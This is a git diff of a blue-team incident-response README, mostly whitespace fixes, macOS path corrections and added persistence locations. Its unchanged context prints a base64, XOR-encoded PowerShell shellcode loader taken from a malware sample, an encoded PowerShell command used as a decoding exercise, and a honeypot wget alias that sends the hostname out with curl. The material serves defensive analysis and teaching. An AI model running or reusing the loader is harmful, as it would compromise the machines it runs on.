@@ -315,8 +315,8 @@ For example in our screenshot, on the left Microsoft's support page supposes the
   + [Evict User](#Evict-User)
     - [Force user logout](#Force-user-logout)
     - [Force user new password](#force-user-new-password)
-    - [Disable AD Account](#Disable-ad-account)	
-    - [Evict from Group](#evict-from-group)	
+    - [Disable AD Account](#Disable-ad-account) 
+    - [Evict from Group](#evict-from-group) 
   + [Computer / Machine Accounts](#computer---machine-accounts)
     - [Show machine accounts that are apart of interesting groups.](#show-machine-accounts-that-are-apart-of-interesting-groups)
     - [Reset password for a machine account.](#reset-password-for-a-machine-account)
@@ -472,8 +472,8 @@ $Users = (Gci C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
 $Pasts = @($Users);
 
 foreach ($Past in $Pasts) {
-	write-host "`n----User Pwsh History Path $Past---`n" -ForegroundColor Magenta; 
-	get-content $Past
+  write-host "`n----User Pwsh History Path $Past---`n" -ForegroundColor Magenta; 
+  get-content $Past
 }
 
 ```
@@ -573,7 +573,7 @@ ft PSChildName, ImagePath -autosize | out-string -width 800
     - [Investigate DNS](#investigate-dns)
   + [IPv6](#ipv6)
     - [Disable Priority Treatment of IPv6](#Disable-Priority-Treatment-of-IPv6)
-   + [BITS Queries](#bits-queries)	
+   + [BITS Queries](#bits-queries)  
 
 </details>
 
@@ -746,7 +746,7 @@ fl DisplayName,JobState,TransferType,FileList, OwnerAccount,BytesTransferred,Cre
     - [Check Constrained Language](#check-constrained-language)
   + [RDP Settings](#rdp-settings)
   + [Query RDP Logs](#query-rdp-logs)
-  + [Current RDP Sessions](#current-rdp-sessions)	
+  + [Current RDP Sessions](#current-rdp-sessions) 
   + [Check Certificates](#check-certificates)
     - [Certificate Dates](#certificate-dates)
   
@@ -986,7 +986,7 @@ Remove-SmbShare -Name MaliciousShare -Confirm:$false -verbose
   + [Identify process CPU usage](#identify-process-cpu-usage)
     - [Sort by least CPU-intensive processes](#sort-by-least-cpu-intensive-processes)
   + [Stop a Process](#stop-a-process)
-  + [Process Tree](#process-tree)	
+  + [Process Tree](#process-tree) 
   
 </details>
 
@@ -1126,11 +1126,11 @@ Fire it off with the `-t` flag to create a parent-child tree of the processes
     - [Get a specific schtask](#get-a-specific-schtask)
     - [To find the commands a task is running](#to-find-the-commands-a-task-is-running)
     - [To stop the task](#to-stop-the-task)
-    - [All schtask locations](#all-schtask-locations)	
+    - [All schtask locations](#all-schtask-locations) 
   + [Show what programs run at startup](#show-what-programs-run-at-startup)
     - [Programs at login](#programs-at-login)
-    - [Programs at PowerShell](#programs-at-powershell)	
-  + [Stolen Links](#stolen-links)	
+    - [Programs at PowerShell](#programs-at-powershell) 
+  + [Stolen Links](#stolen-links) 
   + [Scheduled Jobs](#scheduled-jobs)
     - [Find out what scheduled jobs are on the machine](#find-out-what-scheduled-jobs-are-on-the-machine)
     - [Get detail behind scheduled jobs](#get-detail-behind-scheduled-jobs)
@@ -1144,7 +1144,7 @@ Fire it off with the `-t` flag to create a parent-child tree of the processes
     - [Removing Run Evil](#removing-run-evil)
     - [Other Malicious Run Locations](#other-malicious-run-locations)
     - [Evidence of Run Key Execution](#Evidence-of-Run-Key-Execution)
-  + [Screensaver Persistence](#Screensaver-Persistence)	
+  + [Screensaver Persistence](#Screensaver-Persistence) 
   + [Query Group Policy](#Query-Group-Policy)
     - [Query GPO Scripts](#query-gpo-scripts)
   + [Autoruns](#autoruns)
@@ -1419,10 +1419,10 @@ mount -PSProvider Registry -Name HKU -Root HKEY_USERS
 
 (gci HKLM:\Software\Microsoft\Windows\CurrentVersion\Run, HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce, HKU:\*\Software\Microsoft\Windows\CurrentVersion\Run, HKU:\*\Software\Microsoft\Windows\CurrentVersion\RunOnce ).Pspath |
 Foreach-Object {
-	write-host "----Reg location is $_---" -ForegroundColor Magenta ; 
-	gp $_ | 
-	select -property * -exclude PS*, One*, vm* | #exclude results here
-	FL
+  write-host "----Reg location is $_---" -ForegroundColor Magenta ; 
+  gp $_ | 
+  select -property * -exclude PS*, One*, vm* | #exclude results here
+  FL
 }
 
 #you can squish that all in one line if you need to
@@ -1478,9 +1478,9 @@ mount -PSProvider Registry -Name HKU -Root HKEY_USERS
 
 $folders = @("HKU:\*\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders","HKU:\*\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders","HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders","HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders")
 foreach ($folder in $folders) {
-	write-host "----Reg key is $folder--- -ForegroundColor Magenta "; 
-	get-itemproperty -path "$folder"  | 
-	select -property * -exclude PS* | fl
+  write-host "----Reg key is $folder--- -ForegroundColor Magenta "; 
+  get-itemproperty -path "$folder"  | 
+  select -property * -exclude PS* | fl
 }
 
 ```
@@ -1503,10 +1503,10 @@ mount -PSProvider Registry -Name HKU -Root HKEY_USERS
 
 (gci "HKU:\*\Software\Microsoft\Windows NT\CurrentVersion\Winlogon").PSPath | 
 Foreach-Object {
-	write-host "----Reg location is $_---" -ForegroundColor Magenta ; 
-	gp $_ | 
-	select -property * -exclude PS* |
-	FL
+  write-host "----Reg location is $_---" -ForegroundColor Magenta ; 
+  gp $_ | 
+  select -property * -exclude PS* |
+  FL
 }
 ```
 <img width="1429" alt="image" src="https://user-images.githubusercontent.com/44196051/203814780-c0915f3e-a594-460b-bf4d-c4776addcb86.png">
@@ -1613,7 +1613,7 @@ This is why I like to use PowerShell for much of my blue team work on a Windows 
 <details>
     <summary>section contents</summary>
   
-  + [File Tree](#file-tree)	
+  + [File Tree](#file-tree) 
   + [Wildcard paths and files](#wildcard-paths-and-files)
   + [Check if a specific file or path is alive.](#check-if-a-specific-file-or-path-is-alive)
   + [test if  files and directories are present or absent](#test-if--files-and-directories-are-present-or-absent)
@@ -1873,7 +1873,7 @@ Query the services on this machine, and if you want to see more about one of the
 * `HKLM\SYSTEM\CurrentControlSet\Services\ACPI`
 
 Query software on this machine
-* `HKLM\Software` 	
+* `HKLM\Software`   
 * `HKLM\Software\PickOne`
 
 Query SIDs 
@@ -2284,7 +2284,7 @@ If not Windex, you have the usual Google-Fu methods, and having the file hash wi
      - [Trigger Defender Scan](#trigger-defender-scan)
      - [Check if Defender has been manipulated](#Check-if-Defender-has-been-manipulated)
      - [Enable Defender monitoring](#Enable-Defender-monitoring)
-	
+  
 </details>
 
 ### Query Defender
@@ -2456,7 +2456,7 @@ If you wanted to query this network wide, you've got some options:
 ```powershell
 
 #Show usage log's created after a certain day
-	#use american date, probably a way to convert it but meh
+  #use american date, probably a way to convert it but meh
 gci "C:\Users\*\AppData\Local\Microsoft\*\UsageLogs\*",
 "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\*\UsageLogs\*" | 
 where-object {$_.LastWriteTime -gt [datetime]::parse("11/22/2022")} | 
@@ -2496,8 +2496,8 @@ But keep in mind, an adversary changing the file name is easy and therefore this
   + [Stop Truncation](#stop-trunction)
     - [Out-String](#out-string)
     - [-Wrap](#-wrap)
-  + [Directories](#directories)	
-  + [Transcripts](#transcripts) 	
+  + [Directories](#directories) 
+  + [Transcripts](#transcripts)   
 
 </details>
 
@@ -2990,8 +2990,8 @@ history
   + [Most Recently Used (MRU)](#Most-Recently-Used-(MRU))
   + [Audit Logs](#Audit-Logs)
   + [Command line history](#Command-line-history)
-  + [WHOMST is in the Admin group](#WHOMST-is-in-the-Admin-group)	
-  + [Persistence locations](#Persistence-locations)	
+  + [WHOMST is in the Admin group](#WHOMST-is-in-the-Admin-group) 
+  + [Persistence locations](#Persistence-locations) 
   + [Transparency, Consent, and Control (TCC)](#Transparency,-Consent,-and-Control-(TCC))
 
 
@@ -3056,26 +3056,26 @@ Does what it says…..identifies stuff most recently used
 
 The directory with all the good stuff is here
 ```
-/users/*/Library/Application Support/com.apple.sharedfilelist/
+/Users/*/Library/Application Support/com.apple.sharedfilelist/
 
 #full path to this stuff
-/users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments	
-/users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.FavoriteItems.sfl2		
-/users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.FavoriteVolumes.sfl2		
-/users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ProjectsItems.sfl2		
-/users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentApplications.sfl2
-/users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.iCloudItems.sfl2
-/users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentServers.sfl2
-/users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentHosts.sfl2
-/users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentDocuments.sfl2
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments 
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.FavoriteItems.sfl2   
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.FavoriteVolumes.sfl2   
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ProjectsItems.sfl2   
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentApplications.sfl2
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.iCloudItems.sfl2
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentServers.sfl2
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentHosts.sfl2
+/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentDocuments.sfl2
 ```
 ![image](https://user-images.githubusercontent.com/44196051/170065273-978478c6-106b-4005-9326-d2f647c11524.png)
-```
+
 Another useful subdirectory here containing stuff relevant to recent applicatioons
 
 ```
-/users/users/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments/
-``
+/Users/users/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments/
+```
 
 ![image](https://user-images.githubusercontent.com/44196051/170065301-69717aa6-e325-4266-8f63-aa94eb0a5d58.png)
 
@@ -3140,17 +3140,29 @@ Not complete, just some easy low hanging fruit to check.
 Can get a more complete list [here](https://gist.github.com/jipegit/04d1c577f20922adcd2cfd90698c151b)
 
 ```
-#start up / login items
+# start up / login items
 /var/db/com.apple.xpc.launchd/disabled.*.plist
 /System/Library/StartupItems
+/Users/*/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm
+/var/db/launchd.db/com.apple.launchd/*
 
-#cronjobs / like scheduled tasks 
+# scripts
+/Users/*/Library/Preferences/com.apple.loginwindow.plist
+/etc/periodic/[daily, weekly, monthly]
+
+# cronjobs / like scheduled tasks 
 /private/var/at/tabs/
-/usr/lib/cron/jobs/	
+/usr/lib/cron/jobs/ 
+
+# system extensions
+/Library/SystemExtensions/
 
 # loads of places for annoying persistence amongst daemons
 /System/Library/LaunchDaemons/*.plist
 /System/Library/LaunchAgents/*.plist 
+/Library/LaunchDaemons/*.plist 
+/Library/LaunchAgents/*.plist 
+/Users/*/Library/LaunchAgents/*.plist 
 ```
 
 ![image](https://user-images.githubusercontent.com/44196051/170066210-ff6d6348-5b74-40fd-b7ef-f8a301653a33.png)
@@ -3174,6 +3186,10 @@ You can use some command line tools, or just leverage a tool like Velociraptor, 
 
 ![image](https://user-images.githubusercontent.com/44196051/170066448-d75a766f-25ca-489e-9596-1a1c4e006e16.png)
 
+One of the most beneficial pieces of information is knowing which applicaitons have FDA (Full Disk Access), via the `kTCCServiceSystemPolicyAllFiles` service.
+
+![fulldiskaccess](https://user-images.githubusercontent.com/72467868/207419494-de3500ae-2da5-4af5-83c1-a1b80e5dd8f7.png)
+
 
 ---
 
@@ -3186,7 +3202,7 @@ You can use some command line tools, or just leverage a tool like Velociraptor, 
   + [Process Monitor](#process-monitor)
   + [Hash Check Malware](#hash-check-malware)
   + [Decoding Powershell](#decoding-powershell)
-	
+  
 </details>
 
 I'd reccomend [REMnux](https://docs.remnux.org/), a Linux distro dedicated to malware analysis. If you don't fancy downloading the VM, then maybe just keep an eye on the [Docs](https://docs.remnux.org/discover-the-tools/examine+static+properties/general) as they have some great malware analysis tools in their roster. 
@@ -3202,11 +3218,11 @@ I'd also reccomend [FlareVM](https://github.com/mandiant/flare-vm), a Windows-ba
   + [Strings](#strings)
     - [floss](#floss)
     - [flarestrings](#flarestrings)
-    - [Win32APIs](#win32apis)	
+    - [Win32APIs](#win32apis) 
   + [regshot](#regshot)
   + [fakenet](#fakenet)
-  + [Entropy](#entropy)	
-	
+  + [Entropy](#entropy) 
+  
 </details>
 
 ### Capa
@@ -3490,7 +3506,7 @@ If we click on _Extras_ we get insightful information about the legitimate filep
 
   + [Straight Forward Ocassions](#straight-forward-ocassions)
   + [Obfuscation](#Obfuscation)
-  + [Bytes](#bytes)	
+  + [Bytes](#bytes) 
 
 </details>
 
@@ -3542,7 +3558,7 @@ Let's say you see encoded pwsh, and you want to quickly tell if it's sus or not.
 
 We're going to utilise this example string
 ```
-powershell -ExecutionPolicy Unrestricted -encodedCommand IABnAGUAdAAtAGkAdABlAG0AcAByAG8AcABlAHIAdAB5ACAALQBwAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcACoAIgAgACAAfAAgAD8AIABJAG0AYQBnAGUAUABhAHQAaAAgAC0AbABpAGsAZQAgACIAKgBkAHIAaQB2AGUAcgBzACoAIgA=	
+powershell -ExecutionPolicy Unrestricted -encodedCommand IABnAGUAdAAtAGkAdABlAG0AcAByAG8AcABlAHIAdAB5ACAALQBwAGEAdABoACAAIgBIAEsATABNADoAXABTAHkAcwB0AGUAbQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcACoAIgAgACAAfAAgAD8AIABJAG0AYQBnAGUAUABhAHQAaAAgAC0AbABpAGsAZQAgACIAKgBkAHIAaQB2AGUAcgBzACoAIgA= 
 ```
 
 #### Setup CyberChef
@@ -3674,11 +3690,11 @@ Here's a seperate bit of Powershell malware. I decoded it up to a point, and I w
 
 ```powershell
 If ([IntPtr]::size -eq 8) {
-	[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbKsCMjI3lrquJim5giIyNuEupicmJySSBicmKZdKq85dz2yFp4a6riaxLxaqr7bhLqcUsjEeOncXFimch2DRjc9muq5Wug4HNJKXxrqtKZPCMjI0kjS6MQIyNqqsNimicjIyNimVZlvaXc9muq0muq+Wrk49zc3NxuEupxcWKZDiU7WNz2puMspr4iIyNr3Owsp68iIyPIkMrHIiMjy6Hc3NwMQlNKDFURDERGV3xLRkJHRlEcVlZKRx4QQhEQQkcTQQ4QQhsXDhcVQkUOQRRARw5AFkAWFRIbFBtGRhMjQEI91OUC8tO7DI3t7FEHxV0CI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxITDRMYA3RKTUdMVFADbXcDFQ0RGAN0bHQVFxgDd1FKR0ZNVwwVDRMYA25id2FpcAouKSMOmn/nY6mYOw5OQVNyftKp9hpItf3rAbs0ProvN/ccyuALAatbGBGOWJ2NY+zQ/glsuFaoh0pqIXHzPcoRtOWLPDHqUFS735Fjso5bxJ9e8WkKLcJfw5i/lpyFM60nu4hpKQz2ElgTcYb6/ce+ekpvIrjtcwE3LAHdTvge4DGT6u006lHMLUmGLrhFP/5fdz80Zw2UZezRXANuIpdmpZ4GKmmgJReSqSlU+E+oZhALFm+qEsWFRJxs0Un+JOkQGqMtlgRAcHDF93uo/DzGDM8myCNindOWgXXc9msS6pkjI2MjYpsjMyMjYppjIyMjYpl7h3DG3PZrsHBwa6rEa6rSa6r5YpsjAyMjaqraYpkxtarB3PZroOcDpuNXlUWoJGsi4KbjVvR7e3trJiMjIyNz4Mtc3tzcEhsWDRIaGw0WFA0SFhYjMRd1Ww==')
+  [Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbKsCMjI3lrquJim5giIyNuEupicmJySSBicmKZdKq85dz2yFp4a6riaxLxaqr7bhLqcUsjEeOncXFimch2DRjc9muq5Wug4HNJKXxrqtKZPCMjI0kjS6MQIyNqqsNimicjIyNimVZlvaXc9muq0muq+Wrk49zc3NxuEupxcWKZDiU7WNz2puMspr4iIyNr3Owsp68iIyPIkMrHIiMjy6Hc3NwMQlNKDFURDERGV3xLRkJHRlEcVlZKRx4QQhEQQkcTQQ4QQhsXDhcVQkUOQRRARw5AFkAWFRIbFBtGRhMjQEI91OUC8tO7DI3t7FEHxV0CI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxITDRMYA3RKTUdMVFADbXcDFQ0RGAN0bHQVFxgDd1FKR0ZNVwwVDRMYA25id2FpcAouKSMOmn/nY6mYOw5OQVNyftKp9hpItf3rAbs0ProvN/ccyuALAatbGBGOWJ2NY+zQ/glsuFaoh0pqIXHzPcoRtOWLPDHqUFS735Fjso5bxJ9e8WkKLcJfw5i/lpyFM60nu4hpKQz2ElgTcYb6/ce+ekpvIrjtcwE3LAHdTvge4DGT6u006lHMLUmGLrhFP/5fdz80Zw2UZezRXANuIpdmpZ4GKmmgJReSqSlU+E+oZhALFm+qEsWFRJxs0Un+JOkQGqMtlgRAcHDF93uo/DzGDM8myCNindOWgXXc9msS6pkjI2MjYpsjMyMjYppjIyMjYpl7h3DG3PZrsHBwa6rEa6rSa6r5YpsjAyMjaqraYpkxtarB3PZroOcDpuNXlUWoJGsi4KbjVvR7e3trJiMjIyNz4Mtc3tzcEhsWDRIaGw0WFA0SFhYjMRd1Ww==')
 
-	for ($x = 0; $x -lt $var_code.Count; $x++) {
-		$var_code[$x] = $var_code[$x] -bxor 35
-	}
+  for ($x = 0; $x -lt $var_code.Count; $x++) {
+    $var_code[$x] = $var_code[$x] -bxor 35
+  }
 }
 ```
 
@@ -3844,18 +3860,18 @@ Why don't we backdoor some naighty commands that adversaries like to use on 'Nix
 #IRL
 alias wget ='curl http://honey.comands.uk/$(hostname -f) > /dev/null 2>&1 ; wget'
 # Hostname -f will put the fully qualified domain name of the machine into the GET request to our listening web server
-	#ideally, the website you first hit be a cloud instance or something. Don't actually use 127.0.0.1
-		# the reason we ask it to curl the machine name directory is to alert OUR listener of the specific machine being attacked by the adversary
+  #ideally, the website you first hit be a cloud instance or something. Don't actually use 127.0.0.1
+    # the reason we ask it to curl the machine name directory is to alert OUR listener of the specific machine being attacked by the adversary
 
 
 #for testing
-	# I am hardcoding the machine name in the directory as an example. If I were you, I'd keep the FQDN above
+  # I am hardcoding the machine name in the directory as an example. If I were you, I'd keep the FQDN above
 alias wget='curl http:/127.0.0.1/workstation1337 > /dev/null 2>&1 ; wget'
 
 # Notice the ;wget at the end
-	# this will still execute wget without any worries
-	# However it comes after the curl to our listening honeypot detector
-	# The honeypot detector's output is pushed to the abyss, so it will not alert the adversary
+  # this will still execute wget without any worries
+  # However it comes after the curl to our listening honeypot detector
+  # The honeypot detector's output is pushed to the abyss, so it will not alert the adversary
 ```
 
 If we have a listening web server in real life, it will snitch on the adversary trying to use WGET. This is true for any of the other commands we do too
@@ -5208,14 +5224,14 @@ sudo file pid.6988.0x1c0000.dmp
   + [Shimcache](#shimcache)
   + [Jump Lists](#jump-lists)
   + [SRUM](#SRUM)
-  + [Amcache](#amcache)	
+  + [Amcache](#amcache) 
   + [Certutil History](#certutil-history)
   + [WER](#WER)
   + [BITS](#BITS)
   + [Forensic via Power Usage](#Forensic-via-Power-Usage)
   + [Activities Cache](#Activities-Cache)
 
-	
+  
 </details>
 
 I've spoken about some forensic techniques [here, as a coprorate simp](https://www.huntress.com/resources/tradecraft-tuesday?wchannelid=zy8dl5egyy&wmediaid=s5rb646tl8)
